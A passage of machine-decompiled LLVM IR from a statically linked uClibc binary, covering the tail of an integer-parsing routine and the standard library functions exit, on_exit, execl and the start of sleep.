  %v5_80613ed = load i8, i8* %v4_80613ed, align 1
  %v6_80613ed = and i8 %v5_80613ed, 32
  %v7_80613ed = icmp eq i8 %v6_80613ed, 0
  %v1_80613f1 = icmp eq i1 %v7_80613ed, false
  br i1 %v1_80613f1, label %dec_label_pc_80613e9, label %dec_label_pc_80613f3

dec_label_pc_80613f3:                             ; preds = %dec_label_pc_80613e9, %entry
  %v0_80613e9.lcssa = phi i32 [ %v4_80613d7, %entry ], [ %v1_80613e9, %dec_label_pc_80613e9 ]
  %v2_80613ea.lcssa = phi i8 [ %v2_80613ea41, %entry ], [ %v2_80613ea, %dec_label_pc_80613e9 ]
  %v3_80613ea.lcssa = phi i32 [ %v3_80613ea42, %entry ], [ %v3_80613ea, %dec_label_pc_80613e9 ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_80613f3 = icmp eq i8 %v2_80613ea.lcssa, 43
  br i1 %v9_80613f3, label %dec_label_pc_806140e, label %dec_label_pc_80613f8

dec_label_pc_80613f8:                             ; preds = %dec_label_pc_80613f3
  %v9_80613f8 = icmp eq i8 %v2_80613ea.lcssa, 45
  %v1_8061400 = icmp eq i1 %v9_80613f8, false
  br i1 %v1_8061400, label %dec_label_pc_806140f, label %dec_label_pc_806140e

dec_label_pc_806140e:                             ; preds = %dec_label_pc_80613f3, %dec_label_pc_80613f8
  %storemerge5 = phi i8 [ 1, %dec_label_pc_80613f8 ], [ 0, %dec_label_pc_80613f3 ]
  %v1_806140e = add i32 %v0_80613e9.lcssa, 1
  store i32 %v1_806140e, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_806140f

dec_label_pc_806140f:                             ; preds = %dec_label_pc_80613f8, %dec_label_pc_806140e
  %v0_8061421 = phi i32 [ %v1_806140e, %dec_label_pc_806140e ], [ %v0_80613e9.lcssa, %dec_label_pc_80613f8 ]
  %stack_var_-18.0 = phi i8 [ %storemerge5, %dec_label_pc_806140e ], [ 0, %dec_label_pc_80613f8 ]
  %v1_806140f = and i32 %arg3, -17
  %v2_806140f = icmp eq i32 %v1_806140f, 0
  %v1_8061417 = icmp eq i1 %v2_806140f, false
  br i1 %v1_8061417, label %dec_label_pc_806143d, label %dec_label_pc_8061419

dec_label_pc_8061419:                             ; preds = %dec_label_pc_806140f
  %v1_8061419 = add i32 %arg3, 10
  store i32 %v1_8061419, i32* %esi.global-to-local, align 4
  %v1_806141c = inttoptr i32 %v0_8061421 to i8*
  %v2_806141c = load i8, i8* %v1_806141c, align 1
  %v8_806141c = icmp eq i8 %v2_806141c, 48
  %v1_806141f = icmp eq i1 %v8_806141c, false
  br i1 %v1_806141f, label %dec_label_pc_8061432, label %dec_label_pc_8061421

dec_label_pc_8061421:                             ; preds = %dec_label_pc_8061419
  %v1_8061421 = add i32 %v0_8061421, 1
  store i32 %v1_8061421, i32* %ebx.global-to-local, align 4
  %v1_8061422 = add i32 %arg3, 8
  store i32 %v1_8061422, i32* %esi.global-to-local, align 4
  %v1_8061425 = inttoptr i32 %v1_8061421 to i8*
  %v2_8061425 = load i8, i8* %v1_8061425, align 1
  %v2_8061429 = or i8 %v2_8061425, 32
  %v7_8061429 = zext i8 %v2_8061429 to i32
  %v9_8061429 = and i32 %v3_80613ea.lcssa, -256
  %v10_8061429 = or i32 %v7_8061429, %v9_8061429
  store i32 %v10_8061429, i32* %eax.global-to-local, align 4
  %v10_806142b = icmp eq i8 %v2_8061429, 120
  %v1_806142d = icmp eq i1 %v10_806142b, false
  br i1 %v1_806142d, label %dec_label_pc_8061432, label %dec_label_pc_806142f

dec_label_pc_806142f:                             ; preds = %dec_label_pc_8061421
  %v2_806142f = mul i32 %v1_8061422, 2
  store i32 %v2_806142f, i32* %esi.global-to-local, align 4
  %v1_8061431 = add i32 %v0_8061421, 2
  store i32 %v1_8061431, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061432

dec_label_pc_8061432:                             ; preds = %dec_label_pc_8061421, %dec_label_pc_8061419, %dec_label_pc_806142f
  %v0_806145a13 = phi i32 [ %v1_8061421, %dec_label_pc_8061421 ], [ %v0_8061421, %dec_label_pc_8061419 ], [ %v1_8061431, %dec_label_pc_806142f ]
  %v0_80614b422 = phi i32 [ %v1_8061421, %dec_label_pc_8061421 ], [ %v4_80613d7, %dec_label_pc_8061419 ], [ %v1_8061421, %dec_label_pc_806142f ]
  %v3_806143a = phi i32 [ %v1_8061422, %dec_label_pc_8061421 ], [ %v1_8061419, %dec_label_pc_8061419 ], [ %v2_806142f, %dec_label_pc_806142f ]
  %v1_8061432 = add i32 %v3_806143a, -17
  %v6_8061432 = sub i32 16, %v3_806143a
  %v7_8061432 = and i32 %v6_8061432, %v3_806143a
  %v8_8061432 = icmp slt i32 %v7_8061432, 0
  %v10_8061432 = icmp slt i32 %v1_8061432, 0
  store i32 16, i32* %eax.global-to-local, align 4
  %v2_806143a = icmp eq i1 %v10_8061432, %v8_8061432
  %v5_806143a = select i1 %v2_806143a, i32 16, i32 %v3_806143a
  store i32 %v5_806143a, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_806143d

dec_label_pc_806143d:                             ; preds = %dec_label_pc_806140f, %dec_label_pc_8061432
  %v0_80614b423 = phi i32 [ %v4_80613d7, %dec_label_pc_806140f ], [ %v0_80614b422, %dec_label_pc_8061432 ]
  %v0_806145a12 = phi i32 [ %v0_8061421, %dec_label_pc_806140f ], [ %v0_806145a13, %dec_label_pc_8061432 ]
  %v0_806144c = phi i32 [ %arg3, %dec_label_pc_806140f ], [ %v5_806143a, %dec_label_pc_8061432 ]
  %v1_806143d = add i32 %v0_806144c, -2
  store i32 %v1_806143d, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_8061445 = icmp ugt i32 %v1_806143d, 34
  br i1 %v6_8061445, label %dec_label_pc_80614a9, label %dec_label_pc_8061447

dec_label_pc_8061447:                             ; preds = %dec_label_pc_806143d
  %div = udiv i32 -1, %v0_806144c
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_806144c
  %v1_806144e = trunc i32 %tmp38 to i8
  store i32 %div, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_8061487 = urem i32 %arg4, 256
  br label %dec_label_pc_806145a

dec_label_pc_8061458:                             ; preds = %dec_label_pc_806149f, %dec_label_pc_8061487
  %v2_806145c.pre = phi i32 [ %v0_80614a2, %dec_label_pc_806149f ], [ %v2_806145c.pre.pre, %dec_label_pc_8061487 ]
  %v4_806145a.pre = phi i32 [ %v1_8061473, %dec_label_pc_806149f ], [ %v4_806145a.pre.pre, %dec_label_pc_8061487 ]
  %v0_8061458 = phi i32 [ %v1_806147a, %dec_label_pc_806149f ], [ %v0_8061458.pre, %dec_label_pc_8061487 ]
  %stack_var_-18.1 = phi i8 [ %stack_var_-18.2, %dec_label_pc_806149f ], [ %v6_806148b, %dec_label_pc_8061487 ]
  br label %dec_label_pc_806145a

dec_label_pc_806145a:                             ; preds = %dec_label_pc_8061447, %dec_label_pc_8061458
  %v0_80614b421 = phi i32 [ %v0_80614b423, %dec_label_pc_8061447 ], [ %v0_8061458, %dec_label_pc_8061458 ]
  %v0_806147a = phi i32 [ %v0_806145a12, %dec_label_pc_8061447 ], [ %v0_8061458, %dec_label_pc_8061458 ]
  %v2_806145c = phi i32 [ %v4_80613d7, %dec_label_pc_8061447 ], [ %v2_806145c.pre, %dec_label_pc_8061458 ]
  %v4_806145a = phi i32 [ %div, %dec_label_pc_8061447 ], [ %v4_806145a.pre, %dec_label_pc_8061458 ]
  %stack_var_-18.2 = phi i8 [ %stack_var_-18.0, %dec_label_pc_8061447 ], [ %stack_var_-18.1, %dec_label_pc_8061458 ]
  %v1_806145a = inttoptr i32 %v0_806147a to i8*
  %v2_806145a = load i8, i8* %v1_806145a, align 1
  %v3_806145a = zext i8 %v2_806145a to i32
  %v5_806145a = and i32 %v4_806145a, -256
  %v6_806145a = or i32 %v3_806145a, %v5_806145a
  store i32 %v6_806145a, i32* %eax.global-to-local, align 4
  %v2_806145e = add i8 %v2_806145a, -48
  %v12_806145e = zext i8 %v2_806145e to i32
  %v14_806145e = and i32 %v2_806145c, -256
  %v15_806145e = or i32 %v12_806145e, %v14_806145e
  store i32 %v15_806145e, i32* @ecx, align 4
  %tmp = icmp ult i8 %v2_806145e, 10
  br i1 %tmp, label %dec_label_pc_8061473, label %dec_label_pc_8061466

dec_label_pc_8061466:                             ; preds = %dec_label_pc_806145a
  %v2_8061466 = or i8 %v2_806145a, 32
  %v7_8061466 = zext i8 %v2_8061466 to i32
  %v10_8061466 = or i32 %v7_8061466, %v5_806145a
  store i32 %v10_8061466, i32* %eax.global-to-local, align 4
  %v2_8061468 = or i32 %v14_806145e, 40
  store i32 %v2_8061468, i32* @ecx, align 4
  %tmp55 = icmp ult i8 %v2_8061466, 97
  br i1 %tmp55, label %dec_label_pc_8061473, label %dec_label_pc_806146e

dec_label_pc_806146e:                             ; preds = %dec_label_pc_8061466
  %v2_8061470 = add i8 %v2_8061466, -87
  %v15_8061470 = zext i8 %v2_8061470 to i32
  %v18_8061470 = or i32 %v15_8061470, %v14_806145e
  store i32 %v18_8061470, i32* @ecx, align 4
  br label %dec_label_pc_8061473

dec_label_pc_8061473:                             ; preds = %dec_label_pc_8061466, %dec_label_pc_806145a, %dec_label_pc_806146e
  %v0_80614a2 = phi i32 [ %v2_8061468, %dec_label_pc_8061466 ], [ %v15_806145e, %dec_label_pc_806145a ], [ %v18_8061470, %dec_label_pc_806146e ]
  %v1_8061473 = urem i32 %v0_80614a2, 256
  store i32 %v1_8061473, i32* %eax.global-to-local, align 4
  %v1_8061476 = load i32, i32* %esi.global-to-local, align 4
  %v2_8061476 = sub i32 %v1_8061473, %v1_8061476
  %v10_8061476 = and i32 %v2_8061476, %v1_8061476
  %v11_8061476 = icmp slt i32 %v10_8061476, 0
  %v13_8061476 = icmp slt i32 %v2_8061476, 0
  %v2_8061478 = icmp eq i1 %v13_8061476, %v11_8061476
  br i1 %v2_8061478, label %dec_label_pc_80614a9, label %dec_label_pc_806147a

dec_label_pc_806147a:                             ; preds = %dec_label_pc_8061473
  %v1_806147a = add i32 %v0_806147a, 1
  store i32 %v1_806147a, i32* %ebx.global-to-local, align 4
  %v0_806147b = load i32, i32* %edx.global-to-local, align 4
  %v1_806147b = load i32, i32* %ebp.global-to-local, align 4
  %tmp56 = icmp ugt i32 %v0_806147b, %v1_806147b
  br i1 %tmp56, label %dec_label_pc_8061487, label %dec_label_pc_806147f

dec_label_pc_806147f:                             ; preds = %dec_label_pc_806147a
  %v12_806147b = icmp eq i32 %v0_806147b, %v1_806147b
  %v1_806147f = icmp eq i1 %v12_806147b, false
  br i1 %v1_806147f, label %dec_label_pc_806149f, label %dec_label_pc_8061481

dec_label_pc_8061481:                             ; preds = %dec_label_pc_806147f
  %v1_8061481 = trunc i32 %v0_80614a2 to i8
  %tmp57 = icmp ugt i8 %v1_8061481, %v1_806144e
  br i1 %tmp57, label %dec_label_pc_8061487, label %dec_label_pc_806149f

dec_label_pc_8061487:                             ; preds = %dec_label_pc_8061481, %dec_label_pc_806147a
  store i32 %v4_8061487, i32* %eax.global-to-local, align 4
  %v6_806148b = and i8 %stack_var_-18.2, %tmp37
  %v1_806148f = sext i8 %v6_806148b to i32
  %v2_806148f = call i32 @__errno_location(i32 %v1_806148f)
  store i32 %v2_806148f, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8061497 = inttoptr i32 %v2_806148f to i32*
  store i32 34, i32* %v1_8061497, align 4
  %v0_8061458.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_806145a.pre.pre = load i32, i32* %eax.global-to-local, align 4
  %v2_806145c.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8061458

dec_label_pc_806149f:                             ; preds = %dec_label_pc_8061481, %dec_label_pc_806147f
  %v4_806149f = mul i32 %v0_806147b, %v1_8061476
  store i32 %v1_8061473, i32* %eax.global-to-local, align 4
  %v2_80614a5 = add i32 %v4_806149f, %v1_8061473
  store i32 %v2_80614a5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8061458

dec_label_pc_80614a9:                             ; preds = %dec_label_pc_8061473, %dec_label_pc_806143d
  %v0_80614b4 = phi i32 [ %v0_80614b423, %dec_label_pc_806143d ], [ %v0_80614b421, %dec_label_pc_8061473 ]
  %stack_var_-18.3 = phi i8 [ %stack_var_-18.0, %dec_label_pc_806143d ], [ %stack_var_-18.2, %dec_label_pc_8061473 ]
  %v4_80614a9 = icmp eq i32 %arg2, 0
  br i1 %v4_80614a9, label %dec_label_pc_80614b6, label %dec_label_pc_80614b0

dec_label_pc_80614b0:                             ; preds = %dec_label_pc_80614a9
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_80614b4 = inttoptr i32 %arg2 to i32*
  store i32 %v0_80614b4, i32* %v2_80614b4, align 4
  br label %dec_label_pc_80614b6

dec_label_pc_80614b6:                             ; preds = %dec_label_pc_80614a9, %dec_label_pc_80614b0
  %v8_80614b6 = icmp eq i8 %stack_var_-18.3, 0
  %v2_80614bb = zext i1 %v8_80614b6 to i32
  %v13_80614bb = icmp eq i1 %v8_80614b6, false
  %v1_80614bd3 = or i32 %v2_80614bb, -2147483648
  store i32 %v1_80614bd3, i32* %ebx.global-to-local, align 4
  %v5_80614c3 = icmp eq i8 %tmp37, 0
  br i1 %v5_80614c3, label %dec_label_pc_80614db, label %dec_label_pc_80614ca

dec_label_pc_80614ca:                             ; preds = %dec_label_pc_80614b6
  %v0_80614ca = load i32, i32* %edx.global-to-local, align 4
  %tmp58 = icmp ugt i32 %v0_80614ca, %v1_80614bd3
  br i1 %tmp58, label %dec_label_pc_80614ce, label %dec_label_pc_80614db

dec_label_pc_80614ce:                             ; preds = %dec_label_pc_80614ca
  %v1_80614ce = sext i8 %stack_var_-18.3 to i32
  %v2_80614ce = call i32 @__errno_location(i32 %v1_80614ce)
  store i32 %v2_80614ce, i32* %eax.global-to-local, align 4
  %v0_80614d3 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80614d3, i32* %edx.global-to-local, align 4
  %v1_80614d5 = inttoptr i32 %v2_80614ce to i32*
  store i32 34, i32* %v1_80614d5, align 4
  br label %dec_label_pc_80614db

dec_label_pc_80614db:                             ; preds = %dec_label_pc_80614ca, %dec_label_pc_80614b6, %dec_label_pc_80614ce
  %v0_80614db = load i32, i32* %edx.global-to-local, align 4
  %v1_80614dd = sub i32 0, %v0_80614db
  %v4_80614e4 = select i1 %v13_80614bb, i32 %v1_80614dd, i32 %v0_80614db
  store i32 %v4_80614e4, i32* @edx, align 4
  %v2_80614ea = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80614ea, i32* @ebx, align 4
  store i32 %v4_80614e4, i32* %eax.global-to-local, align 4
  ret i32 %v4_80614e4

; uselistorder directives
  uselistorder i32 %v4_80614e4, { 1, 0, 2 }
  uselistorder i1 %v8_80614b6, { 1, 0 }
  uselistorder i8 %v6_806148b, { 1, 0 }
  uselistorder i32 %v1_806147b, { 1, 0 }
  uselistorder i32 %v0_806147b, { 2, 1, 0 }
  uselistorder i32 %v1_806147a, { 1, 0 }
  uselistorder i32 %v2_8061476, { 1, 0 }
  uselistorder i32 %v1_8061473, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_80614a2, { 2, 0, 1 }
  uselistorder i8 %v2_8061466, { 1, 0, 2 }
  uselistorder i32 %v14_806145e, { 0, 2, 1 }
  uselistorder i32 %v0_8061458, { 1, 0 }
  uselistorder i32 %v0_806144c, { 1, 0, 2 }
  uselistorder i32 %v3_806143a, { 1, 0, 3, 2 }
  uselistorder i32 %v2_806142f, { 1, 0 }
  uselistorder i32 %v1_8061422, { 1, 0, 2 }
  uselistorder i8 %stack_var_-18.0, { 1, 0 }
  uselistorder i32 %v0_8061421, { 1, 2, 0, 3, 4 }
  uselistorder i8 %tmp37, { 1, 0 }
  uselistorder i8 %v2_80613ea.lcssa, { 1, 0 }
  uselistorder i32 %v0_80613e9.lcssa, { 1, 0 }
  uselistorder i32 %v1_80613e9, { 0, 3, 2, 1 }
  uselistorder i32 %v0_80613df, { 1, 0, 2 }
  uselistorder i32 %v4_80613d7, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32* %esi.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 6, 1, 2, 3, 4, 7, 8 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 9, 10, 4, 5, 6, 7, 8, 11, 12, 13, 14, 15 }
  uselistorder i8 -87, { 1, 0 }
  uselistorder i32 -17, { 2, 5, 1, 3, 0, 4 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80614db, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80614b6, { 1, 0 }
  uselistorder label %dec_label_pc_8061473, { 2, 0, 1 }
  uselistorder label %dec_label_pc_806145a, { 1, 0 }
  uselistorder label %dec_label_pc_806143d, { 1, 0 }
  uselistorder label %dec_label_pc_8061432, { 2, 0, 1 }
  uselistorder label %dec_label_pc_806140f, { 1, 0 }
  uselistorder label %dec_label_pc_806140e, { 1, 0 }
  uselistorder label %dec_label_pc_80613e9, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8061507 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8061507, i32* @ebx, align 4
  %v4_806150c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134589241, i32 ptrtoint (i32* @global_var_8075620.710 to i32))
  %v1_8061518 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075620.710 to i32))
  %v0_806151d = load i32, i32* @global_var_807df04.711, align 4
  %v1_8061525 = icmp eq i32 %v0_806151d, 0
  br i1 %v1_8061525, label %dec_label_pc_8061532, label %dec_label_pc_8061529

dec_label_pc_8061529:                             ; preds = %entry
  %v0_806152c = load i32, i32* @esi, align 4
  %v1_806152d = call i32 @unknown_0(i32 %v0_806152c)
  br label %dec_label_pc_8061532

dec_label_pc_8061532:                             ; preds = %entry, %dec_label_pc_8061529
  %v3_8061537 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v0_806153c = call i32 @__GI___uClibc_fini()
  %v0_806154d = call i32 @_stdio_term()
  %v0_8061555 = load i32, i32* @esi, align 4
  %v1_8061556 = call i32 @__GI__exit(i32 %v0_8061555)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 2, 3, 1, 10, 0, 13, 12, 11, 9, 8, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_8061532, { 1, 0 }
}

define i32 @on_exit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_806155f = call i32 @__new_exitfn()
  store i32 -1, i32* %eax.global-to-local, align 4
  %v1_8061569 = icmp eq i32 %v0_806155f, 0
  br i1 %v1_8061569, label %dec_label_pc_8061583, label %dec_label_pc_806156d

dec_label_pc_806156d:                             ; preds = %entry
  %v2_8061571 = add i32 %v0_806155f, 4
  %v3_8061571 = inttoptr i32 %v2_8061571 to i32*
  store i32 %arg1, i32* %v3_8061571, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v1_8061578 = inttoptr i32 %v0_806155f to i32*
  store i32 2, i32* %v1_8061578, align 4
  %v0_806157e = load i32, i32* %eax.global-to-local, align 4
  %v2_806157e = add i32 %v0_806155f, 8
  %v3_806157e = inttoptr i32 %v2_806157e to i32*
  store i32 %v0_806157e, i32* %v3_806157e, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061583

dec_label_pc_8061583:                             ; preds = %entry, %dec_label_pc_806156d
  %v0_8061586 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_806156d ]
  ret i32 %v0_8061586

; uselistorder directives
  uselistorder i32 %v0_806155f, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8061583, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_806158e = load i32, i32* @ebx, align 4
  store i32 %v0_806158e, i32* %stack_var_-12, align 4
  %v2_806158f = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_806158f, i32* %eax.global-to-local, align 4
  %v12_8061592 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8061598

dec_label_pc_8061598:                             ; preds = %dec_label_pc_8061598, %entry
  %v0_806159b = phi i32 [ 0, %entry ], [ %v1_806159b, %dec_label_pc_8061598 ]
  %stack_var_-16.0 = phi i32 [ %v2_806158f, %entry ], [ %v1_806159c, %dec_label_pc_8061598 ]
  %v1_806159b = add i32 %v0_806159b, 1
  store i32 %v1_806159b, i32* %esi.global-to-local, align 4
  %v1_806159c = add i32 %stack_var_-16.0, 4
  store i32 %v1_806159c, i32* %eax.global-to-local, align 4
  %v1_80615a2 = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_80615a2 = load i32, i32* %v1_80615a2, align 4
  %v3_80615a2 = icmp eq i32 %v2_80615a2, 0
  %v1_80615a5 = icmp eq i1 %v3_80615a2, false
  br i1 %v1_80615a5, label %dec_label_pc_8061598, label %dec_label_pc_80615a7

dec_label_pc_80615a7:                             ; preds = %dec_label_pc_8061598
  %v1_80615a7 = mul i32 %v1_806159b, 4
  %v2_80615a7 = add i32 %v1_80615a7, 34
  %v1_80615ae = and i32 %v2_80615a7, -16
  %v2_80615b1 = sub i32 %v12_8061592, %v1_80615ae
  %v1_80615b6 = add i32 %v2_80615b1, 15
  %v1_80615ba = and i32 %v1_80615b6, -16
  store i32 %v1_80615ba, i32* @ebx, align 4
  store i32 %v1_80615ba, i32* %ecx.global-to-local, align 4
  %v2_80615bf = inttoptr i32 %v1_80615ba to i32*
  store i32 %arg2, i32* %v2_80615bf, align 16
  store i32 %v2_806158f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80615c7

dec_label_pc_80615c7:                             ; preds = %dec_label_pc_80615c7, %dec_label_pc_80615a7
  %stack_var_-16.1 = phi i32 [ %v2_806158f, %dec_label_pc_80615a7 ], [ %v1_80615ce, %dec_label_pc_80615c7 ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_80615ca = load i32, i32* %ecx.global-to-local, align 4
  %v1_80615ca = add i32 %v0_80615ca, 4
  store i32 %v1_80615ca, i32* %ecx.global-to-local, align 4
  %v0_80615cd = load i32, i32* %esi.global-to-local, align 4
  %v1_80615cd = add i32 %v0_80615cd, -1
  %v8_80615cd = icmp eq i32 %v1_80615cd, 0
  store i32 %v1_80615cd, i32* %esi.global-to-local, align 4
  %v1_80615ce = add i32 %stack_var_-16.1, 4
  %v1_80615d4 = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_80615d4 = load i32, i32* %v1_80615d4, align 4
  store i32 %v2_80615d4, i32* %eax.global-to-local, align 4
  %v2_80615d6 = inttoptr i32 %v1_80615ca to i32*
  store i32 %v2_80615d4, i32* %v2_80615d6, align 4
  %v1_80615d8 = icmp eq i1 %v8_80615cd, false
  br i1 %v1_80615d8, label %dec_label_pc_80615c7, label %dec_label_pc_80615da

dec_label_pc_80615da:                             ; preds = %dec_label_pc_80615c7
  %v0_80615da = load i32, i32* %eax.global-to-local, align 4
  %v1_80615da = load i32, i32* @esp, align 4
  %v2_80615da = add i32 %v1_80615da, -4
  %v3_80615da = inttoptr i32 %v2_80615da to i32*
  store i32 %v0_80615da, i32* %v3_80615da, align 4
  %v0_80615db = load i32, i32* @global_var_807df10.712, align 16
  %v2_80615db = add i32 %v1_80615da, -8
  %v3_80615db = inttoptr i32 %v2_80615db to i32*
  store i32 %v0_80615db, i32* %v3_80615db, align 4
  %v0_80615e1 = load i32, i32* @ebx, align 4
  %v2_80615e1 = add i32 %v1_80615da, -12
  %v3_80615e1 = inttoptr i32 %v2_80615e1 to i32*
  store i32 %v0_80615e1, i32* %v3_80615e1, align 4
  %v5_80615e2 = add i32 %v1_80615da, -16
  %v6_80615e2 = inttoptr i32 %v5_80615e2 to i32*
  store i32 %arg1, i32* %v6_80615e2, align 4
  %v1_80615e5 = inttoptr i32 %v1_80615ce to i8*
  %v2_80615e5 = call i32 @__GI_execve(i8* %v1_80615e5)
  store i32 %v2_80615e5, i32* %eax.global-to-local, align 4
  %v2_80615ed = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80615ed, i32* @ebx, align 4
  ret i32 %v2_80615e5

; uselistorder directives
  uselistorder i32 %v1_80615cd, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_806159c, { 1, 0 }
  uselistorder i32 %v1_806159b, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_806158f, { 0, 2, 1, 3 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_80615f4 = load i32, i32* @ebp, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  %v0_80615fa = load i32, i32* @edi, align 4
  %v0_80615fb = load i32, i32* @esi, align 4
  %v0_80615fc = load i32, i32* @ebx, align 4
  %v15_80615fd = ptrtoint i32* %stack_var_-444 to i32
  store i32 %arg1, i32* @edx, align 4
  %v1_806160a = icmp eq i32 %arg1, 0
  %v1_806160c = icmp eq i1 %v1_806160a, false
  br i1 %v1_806160c, label %dec_label_pc_806161e.preheader, label %dec_label_pc_806176b

dec_label_pc_806161e.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061613

dec_label_pc_8061613:                             ; preds = %dec_label_pc_8061613.dec_label_pc_8061613_crit_edge, %dec_label_pc_806161e.preheader
  %v0_8061613 = phi i32 [ %v15_80615fd, %dec_label_pc_806161e.preheader ], [ %v0_8061613.pre, %dec_label_pc_8061613.dec_label_pc_8061613_crit_edge ]
  %v1_806161e27 = phi i32 [ 31, %dec_label_pc_806161e.preheader ], [ %v1_806161e, %dec_label_pc_8061613.dec_label_pc_8061613_crit_edge ]
  %v2_8061613 = mul i32 %v1_806161e27, 4
  %v3_8061613 = add i32 %v2_8061613, 292
  %v4_8061613 = add i32 %v3_8061613, %v0_8061613
  %v5_8061613 = inttoptr i32 %v4_8061613 to i32*
  store i32 0, i32* %v5_8061613, align 4
  %v0_806161e.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_806161e = add i32 %v0_806161e.pre, -1
  %v9_806161e = icmp slt i32 %v1_806161e, 0
  store i32 %v1_806161e, i32* %eax.global-to-local, align 4
  %v1_806161f = icmp eq i1 %v9_806161e, false
  br i1 %v1_806161f, label %dec_label_pc_8061613.dec_label_pc_8061613_crit_edge, label %dec_label_pc_8061621

dec_label_pc_8061613.dec_label_pc_8061613_crit_edge: ; preds = %dec_label_pc_8061613
  %v0_8061613.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8061613

dec_label_pc_8061621:                             ; preds = %dec_label_pc_8061613
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_8061637 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8061637, i32* @ebx, align 4
  store i32 %v2_8061637, i32* %stack_var_-460, align 4
  %v4_806163f = call i32 @__sigaddset(i32 %v2_8061637, i32 17, i32 %v1_806161e, i32 %v1_806161e)
  store i32 %v4_806163f, i32* %eax.global-to-local, align 4
  %v2_8061647 = icmp slt i32 %v4_806163f, 0
  br i1 %v2_8061647, label %dec_label_pc_806176f, label %dec_label_pc_806164f

dec_label_pc_806164f:                             ; preds = %dec_label_pc_8061621
  %v2_8061650 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_8061650, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_806165b = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_806165b = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_806165b, i32 %v2_8061650)
  store i32 %v4_806165b, i32* %eax.global-to-local, align 4
  %v1_8061663 = icmp eq i32 %v4_806165b, 0
  %v1_8061665 = icmp eq i1 %v1_8061663, false
  br i1 %v1_8061665, label %dec_label_pc_806176f, label %dec_label_pc_806166b

dec_label_pc_806166b:                             ; preds = %dec_label_pc_806164f
  store i32 %v2_8061650, i32* %stack_var_-460, align 4
  %v4_8061670 = call i32 @__sigismember(i32 %v2_8061650, i32 17, i32 %v4_806165b, i32 %v4_806165b)
  store i32 %v4_8061670, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_806167d = icmp eq i32 %v4_8061670, 0
  br i1 %v1_806167d, label %dec_label_pc_8061691.preheader, label %dec_label_pc_8061739

